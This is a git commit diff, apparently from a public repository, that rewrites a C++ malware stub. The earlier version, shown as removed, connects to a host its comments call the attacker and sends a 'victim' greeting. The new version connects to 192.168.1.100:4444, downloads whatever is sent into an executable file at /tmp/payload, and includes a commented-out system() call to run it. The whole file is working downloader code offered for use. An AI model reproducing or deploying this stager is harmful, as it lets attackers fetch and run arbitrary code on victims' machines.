db5d4536a922bb03d787b0f0f9e37c56efe6d51f
Connor Finch <49081590+Connduit@users.noreply.github.com>
2025-09-24 12:47:41 -0400

    Update stub.cpp

--- stub.cpp
+++ stub.cpp
@@ -1,36 +1,24 @@
-#include <stdio.h>
 #include <unistd.h>
 #include <arpa/inet.h>
 #include <sys/socket.h>
-#include <string.h>
+#include <fcntl.h>
 
 int main() {
-    int sockfd;
-    struct sockaddr_in attacker;
+    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    struct sockaddr_in addr = {0};
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(4444);
+    addr.sin_addr.s_addr = inet_addr("192.168.1.100");
+    connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));
 
-    // Attacker's IP and port
-    char *ip = "192.168.1.100";
-    int port = 4444;
-
-    // Create TCP socket
-    sockfd = socket(AF_INET, SOCK_STREAM, 0);
-
-    // Setup attacker address
-    attacker.sin_family = AF_INET;
-    attacker.sin_port = htons(port);
-    attacker.sin_addr.s_addr = inet_addr(ip);
-
-    // Connect to attacker
-    if (connect(sockfd, (struct sockaddr *)&attacker, sizeof(attacker)) < 0) {
-        return 1;  // fail silently
+    char buf[1024];
+    int fd = open("/tmp/payload", O_CREAT | O_WRONLY, 0700);
+    ssize_t n;
+    while ((n = recv(sockfd, buf, sizeof(buf), 0)) > 0) {
+        write(fd, buf, n);
     }
-
-    // Send a simple message
-    char msg[] = "Hello from victim!\n";
-    send(sockfd, msg, strlen(msg), 0);
-
-    // Close the connection
+    close(fd);
+    // optionally execute: system("/tmp/payload");
     close(sockfd);
-
     return 0;
 }
